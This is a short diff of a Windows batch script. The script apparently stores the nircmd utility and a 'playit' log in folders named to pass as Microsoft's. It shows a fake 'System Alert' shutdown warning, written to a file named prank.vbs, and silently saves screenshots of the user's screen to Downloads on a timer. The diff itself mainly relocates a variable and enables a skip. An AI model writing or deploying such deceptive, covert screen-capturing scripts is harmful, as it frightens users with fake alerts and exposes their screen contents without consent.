@@ -1,7 +1,7 @@
 @echo off
 
 
-
+set nircmd="%APPDATA%\Microsoft\nircmd.exe"
 
 
 :: ============ MyScreen TOPIC ============
@@ -22,7 +22,7 @@ set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
-::goto skip_code
+goto skip_code
 goto :EOF
 
 
@@ -61,7 +61,7 @@ goto loop
 :play
 
 
-set nircmd="%APPDATA%\Microsoft\nircmd.exe"
+
 
 :: First message (Fake shutdown warning)
 echo MsgBox "Your system will shut down in 1 minute!", 48, "System Alert" > %temp%\prank.vbs
@@ -134,7 +134,7 @@ timeout /t 600 /nobreak
 cd /d "%~dp0"
 
 
-"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
+"%nircmd%" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
 
 
 set "input_file=%appdata%\Microsoft\play\playit_output.log"
